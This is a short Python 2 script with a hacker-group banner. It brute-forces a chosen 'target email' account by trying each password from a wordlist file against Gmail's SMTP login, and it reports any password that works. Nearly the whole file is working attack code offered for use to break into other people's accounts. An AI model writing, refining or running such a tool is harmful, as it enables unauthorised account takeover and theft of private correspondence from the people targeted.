import smtplib
from os import system
def hell():
                    mawar = "\033[31;m1"
                    susu1 = "\033[37;1m"
                    hole1 = "\033[32;1m"

                    print hole1+"..%%%%....%%%%...%%......%%....."
                    print hole1+".%%..%%..%%..%%..%%......%%....."
                    print hole1+".%%......%%%%%%..%%......%%....."
                    print hole1+".%%..%%..%%..%%..%%......%%....."
                    print hole1+"..%%%%...%%..%%..%%%%%%..%%%%%%."
                    print hole1+"................................"
                    print hole1+"%%%%%%..%%%%%....%%%%...%%...%%."
                    print hole1+"%%......%%..%%..%%..%%..%%%.%%%."
                    print hole1+"%%%%....%%%%%...%%..%%..%%.%.%%."
                    print hole1+"%%......%%..%%..%%..%%..%%...%%."
                    print hole1+"%%......%%..%%...%%%%...%%...%%."
                    print hole1+"................................"
                    print hole1+".%%..%%..%%%%%%..%%......%%....."
                    print hole1+".%%..%%..%%......%%......%%....."
                    print hole1+".%%%%%%..%%%%....%%......%%....."
                    print hole1+".%%..%%..%%......%%......%%....."
                    print hole1+".%%..%%..%%%%%%..%%%%%%..%%%%%%."
                    print hole1+"................................"
                    print "|=======-<><><><><><><><><><><><>-=======|"
                    print "<=======    !Coded By VODKA.sh     =======>"
                    print "<======= !Electronic anger  =======>"
                    print "<======= !zoro Lebanon My love =======>"
                    print "<======= !Black shadows My love=======>"
                    print "<======= !Anonymous Egypt My love =======>"
                    print "<======= !Anonymous Morocco My love =======>"
                    print "|=======-<><><><><><><><><><><><>-=======|\n"

hell()
mawar = "\033[31;1m"

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input(mawar+"-->[!]  Put your target email : ")
passwd = raw_input(mawar+"-->[!]   Put no password : ")
passwd = open(passwd, "r")

for password in passwd:
    try:
                            smtpserver.login(user, password)
                            system("clear")
                            hell()
                            print mawar+"\n"
                            print mawar+"-->[!] Password Detected :" + password
                            break
    except smtplib.SMTPAuthenticationError as e:
                error = str(e)
                if error[14] == '<':
                            system('clear')
                            hell()
                            print "\n"
                            print mawar+"-->[!] Password Zonk!:" + password
                            break
                else:
                        print mawar+"-->[!] Password Zonk!:" + password


